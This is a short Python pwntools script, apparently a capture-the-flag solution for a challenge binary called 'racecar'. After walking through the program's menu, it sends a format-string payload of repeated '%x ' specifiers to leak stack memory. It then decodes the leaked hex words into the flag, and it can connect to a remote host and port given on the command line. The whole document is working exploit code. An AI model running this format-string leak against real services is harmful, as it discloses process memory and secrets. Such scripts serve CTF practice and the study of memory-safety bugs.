#!/usr/bin/env python3

from pwn import *



def exploit(io):

    io.sendline(b"username")
    io.sendline(b"username")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"1")

    io.sendlineafter(b"> ", b"%x "*200)
    io.recvline()
    io.recvline()

    data = io.recv().split(b" ")
    flag = b""
    for i in range(11,21):
        try:
            flag += (bytes.fromhex(data[i].decode()))[::-1]
        except:
            break
    print(flag)


def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./racecar")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)

    exploit(io)

if __name__ == "__main__":
    main()
